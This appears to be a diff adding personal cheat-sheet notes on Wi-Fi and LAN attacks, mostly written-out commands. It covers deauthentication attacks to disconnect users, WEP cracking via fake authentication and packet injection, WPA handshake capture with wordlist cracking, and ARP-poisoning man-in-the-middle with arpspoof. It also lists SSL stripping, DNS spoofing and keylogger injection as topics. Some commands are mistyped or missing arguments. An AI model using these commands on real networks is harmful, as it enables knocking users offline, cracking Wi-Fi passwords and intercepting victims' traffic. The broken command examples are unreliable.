@@ -1,0 +1,153 @@
+1. service network-manager restart --> restart network
+2. macchanger --random wlan0 --> change Mac Address\
+3. ifconfig wlan0 up
+4. sudo airmon-ng start wlan0  --> on monitor mode
+5. iwconfig wlan0mon   
+6. airmon-ng stop wlan0mon --> stop monitor mode
+7. iwconfig wlan0 --> check mode
+8. iwconfig wlan0 mode monitor --> manual mode change --> before that down command is ip
+9. iwconfig wlan0 mode managed
+
+
+### Network Sniffing (Gather info)
+
+
+1. airmon-ng start <interface>
+2. airodump-ng <interface>
+3. control + c
+
+
+
+4. airodump-ng --channel <channel> --bssid <bssid> --write <file_name> <interface>
+
+
+5. airodump-ng --channel 12 --bssid 40:30:20:10 --write test mon0
+
+
+## Deauthentication attack --> disconnect connected users
+
+1. aireplay-ng --deauth <packets> -a <AP> <interface>
+
+e.g --> aireplay-ng  --deauth 1000 -a 10:20:30:40 wlan0mon
+
+2. aireplay-ng --deauth <packets> - a <Ap> -c <target> <interface>
+
+
+## Wirelss attacks
+
+-> Encryption Models --> WEP and WPA / WPA2
+-> Cracking WEP
+-> Fake Authentication
+-> Packet Injection
+-> How WPA Works
+-> Capturing Handshakes
+-> Creating Wordlists
+-> WPA Live Cracking
+-> Safe Routers
+
+
+## Cracking WEP encrypted wifi password:
+
+1. --> airodump-ng --channel <channel> --bssid <bssid> --write <file_name> <interface>
+
+2. --> aircrack-ng <file_name>
+
+3. --> e.g aircrack-ng test01.cap
+
+
+## WEP Cracking --> fake Auth 
+
+
+--> aireplay-ng --fakeauth 0 -a <target_mac> -h <kali_mac> <interface>
+
+e.g.aireplay-ng --fakeauth 0 10:20:30:40 -h 50:AA:BB:40 wlan0mon
+
+
+
+### WEP --> Packet injection to easily crack password
+
+--> aireplay-ng --arpreplay -b <attack_machine_mac> -h  <own_mac> <interface>
+
+
+
+### Handshake and WOrdlist
+# Capturing Handshake file
+
+aireplay-ng --deauth <packets> -a <AP> <interface>
+
+# Creating Wordlist
+
+./ crunch <min> <max> <char> -t <pattern> -o file
+
+e.g ./ crunch 8 10 123!'^+% -t m@@@p -file wordlist
+
+
+## WPA Cracking
+
+aircrack-ng <handshake.cap> -w <wordlist>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+###############################################################################################
+
+
+
+Post Connection Attack --> work within the same network below all attacks
+
+-> Post Connection Settings
+
+
+-> Netdiscover
+
+	-> netdiscover -i <interface> -r <range>
+	---> e.g netdiscover -i wlan0 192.168.1.1/24
+	
+	-> zenmap
+	   --> ping scan
+	   --> quick scan
+	   --> quick scan plus
+
+
+-> nMap --> zenmap(UI tool)
+	
+	
+
+-> Man In the middle
+
+		---> ARP Poisioning
+		
+			--> arpspoof -i <interface> -t <target_ip> <AP_IP>
+			--> arpspoof -i <interface> - t <AP_IP> <target_ip>
+			--> echo 1 > /proc/sys/net/ipv4/ip_forward
+			
+		--> Manual ARP(Address Resolution Protocol--> IP --> MAC) Poison
+			1. ifconfig / netdiscover
+			2. arpspoof -i eth0 -t <victam_Ip> <router address>
+			3. arpspoof -i eth0 -t <router> <victim>
+			4. echo 1 > /proc/sys/net/ipv4/ip_forward(Do every time when doing arp poisoning)
+			
+			
+-> Manual Arp Poison
+-> MITM Framwork
+-> Using SSL Strip
+-> What is HSTS
+-> DNS Spoofing
+-> Taking Screenshot of target
+-> Injecting a keylogger
+-> Wireshark Setup
+-> Wireshark Analysis
+-> How to Protect yourself
